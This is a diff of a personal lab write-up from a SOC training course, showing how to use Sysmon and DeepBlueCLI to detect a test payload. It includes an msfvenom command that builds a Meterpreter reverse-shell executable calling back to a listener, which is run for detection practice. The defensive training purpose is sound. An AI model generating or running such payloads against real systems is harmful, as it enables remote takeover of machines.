@@ -2,7 +2,7 @@
 {"dg-publish":true,"permalink":"/bhis-antisyphon-and-webinars/black-hills-soc-core/labs/bhis-socc-lab-sysmon/"}
 ---
 
-## LAB: Sysmon Log
+## LAB: [[Tool Deep-Dives/Windows/Sysmon\|Sysmon]] Log
 [IntroLabs/IntroClassFiles/Tools/IntroClass/Sysmon/Sysmon.md at master · strandjs/IntroLabs · GitHub](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/Sysmon/Sysmon.md)
 
 In this lab, we're looking at Sysmon and the kinds of logs it returns.
@@ -87,11 +87,12 @@ We've done this on a few labs, so I'll just summarize here.
 	1. `sudo msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=172.30.99.174 lport=4444 -f exe -o /tmp/TrustMe.exe`
 	2. `cd /tmp`
 	3. `sudo ls -l TrustMe.exe`
+		1. This is basically just to check and verify the file's existence.
 	4. `sudo cp ./TrustMe.exe /mnt/c/tools`
 3. Start the "remote" handler
 	1. New Ubuntu terminal
 	2. ![BHIS-SOCC-lab-Sysmon-1.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-1.png)
-		1. Commands in blue
+		1. Commands are highlighted in blue
 4. Run TrustMe.exe
 	1. Open an admin Command terminal, and run `\tools\TrustMe.exe`
 	2. You should see Meterpreter complete the connection
@@ -104,7 +105,7 @@ We've done this on a few labs, so I'll just summarize here.
 #### 3. **Export and review the logs with DeepBlueCLI**
 We've got two avenues we could go here; either run [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]] against the running Event Logs, or copy the relevant EVTX files for offline review. 
 
-Running `DeepBlue.ps1` without any arguments tells it to check the running config, and the script below copies specific EVTX files from their source directory and then merges the EVTX files [with this script into a single file](https://github.com/abhinav-eyesOnglass/evtx), and then scans the file with [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]].
+Running `DeepBlue.ps1` without any arguments tells it to check the "Windows Security" log source, but we can specify , and the script below copies specific EVTX files from their source directory and then merges the EVTX files [with this script into a single file](https://github.com/abhinav-eyesOnglass/evtx), and then scans the file with [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]].
 
 ```PowerShell
 $uniqstamp = Get-Date -f yyMMddhhmmss
@@ -138,15 +139,54 @@ In either case, we get nothing.
 
 ![BHIS-SOCC-lab-Sysmon-4.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-4.png)
 #### 4. **Stop the Malware**
-
-Had to pause here and reboot because I ran out of time.
-
+I rebooted the machine as I had to run an errand, and this effectively stopped the malware. Now we can re-install Sysmon using the default config.
 #### 5. Install Sysmon
+Installing Sysmon is dead simple. We configure Sysmon using SwiftOnSecurity's [sysmon-config (Sysmon configuration file template with default high-quality event tracing)](https://github.com/SwiftOnSecurity/sysmon-config) (version 71).
+
+Running Terminal as admin, we CD to `\Tools` and run `Sysmon64.exe -accepteula -i sysmonconfig-export.xml`
+![BHIS-SOCC-lab-Sysmon-5.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-5.png)
+
+With Sysmon running again, let's redo the malware we setup earlier.
 #### 6. Configure and run the malware
+See [[BHIS Antisyphon and Webinars/BlackHills SOC Core/Labs/BHIS-SOCC-lab-Sysmon#2. Create and run the malware\|2. Create and run the malware]], though since I rebooted, the IP address has changed.
 #### 7. Review the logs and **export and review the logs with DeepBlueCLI**
-### Lab work
-1. Create some malware
-2. Begin Sysmon (should already be running)
-3. Investigate Sysmon Logs (Application-Microsoft-Windows-Sysmon/Operational)
-	1. Once you find the event, you can find a TON of information about that event
-4. [GPO and Sysmon](https://www.syspanda.com/index.php/2017/02/28/deploying-sysmonthrough-gpo/)
+If we go into Event Viewer, we can search for TrustMe.exe and find a bunch of great information about it.
+
+Information like the *ProcessID*, *ParentProcessID*, the *CommandLine* commands used to execute it, all nifty stuff!
+
+![BHIS-SOCC-lab-Sysmon-6.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-6.png)
+
+If we had a SIEM or event log parser, we could ingest this information and run queries against it, which would be great. 
+
+Ok, now let's check DeepBlueCLI and see what it finds!
+`DeepBlue.ps1 -logs sysmon`
+... it still fails to show us TrustMe.exe going hog-wild on our system.
+
+I think that maybe I'm doing something wrong, or newer versions of DeepBlueCLI work better, so I download the latest version of DeepBlueCLI, and run it against the Sysmon logs. I don't get *nothing*, but I don't get anything about the [[Tool Deep-Dives/Metasploit/Metasploit\|Metasploit]] backdoor, and what I do get appear to be mostly Java, Edge, and VMWare looking for updates.
+
+Interestingly, when I have DeepBlueCLI check against the merged EVTX file, I think it just checks against the "System" logs. If I run DeepBlueCLI against the individual log files, it reveals more/different information than against the merged file, which is not ideal. I'm not sure if that's a problem with the merging process I'm using or the DBC itself, but it might be worth investigating later.
+
+So let's take another tac; I did some searching around and found [this article by Michael Buckbee](https://www.varonis.com/blog/sysmon-threat-detection-guide) that discusses how he analyses Sysmon events.
+
+He wrote a simple [[Tool Deep-Dives/Windows/PowerShell\|PowerShell]] module that converts Events into PowerShell objects, which we can then search and filter through.^[He also integrated a graphing feature, which is neat, but I'm not going to dive into today.] Since the events are now objects, we can easily sort them in a table or export them to a CSV or whatever we want!
+
+I download and invoke his Sysmon module^[[sysmon/Sysmon.psm1 at master · agreenjay/sysmon · GitHub](https://github.com/agreenjay/sysmon/blob/master/Sysmon.psm1)], and send the output to an array.
+
+PS C:\> `$ SysmonEvents = Get-SysmonLogs`
+
+This takes a few minutes to run, even with 8 cores.^[It looks like the process is limited to two cores only, hence the delay.] However, sending it to an array front loads all the information, and we can then run searches against the array, which is much more efficient.
+
+With the array, I can now run a simple search which looks for unusual activity, like starting process from CMD or PowerShell.^[Most users won't ever do this, so it's a good place to start looking for most users.] Since we're manually scrolling, I'm going to `out-host -Paging` the result.
+
+``
+```PowerShell
+$SysmonEvents | where-object {$_.ParentImage -like '*cmd.exe' -or $_.ParentImage -like '*powershell.exe'} | select UtcTime,ProcessID,Image,CommandLine,ParentProcessID,ParentCommandLine | out-host -paging
+```
+
+And our first hit knocks it out of the park!
+![BHIS-SOCC-lab-Sysmon-7.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-7.png)
+
+
+# Final Thoughts
+I was surprised by the lack of results from [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]], but that's probably just because of a lack of familiarity with the tool.
+[GPO and Sysmon](https://www.syspanda.com/index.php/2017/02/28/deploying-sysmonthrough-gpo/)
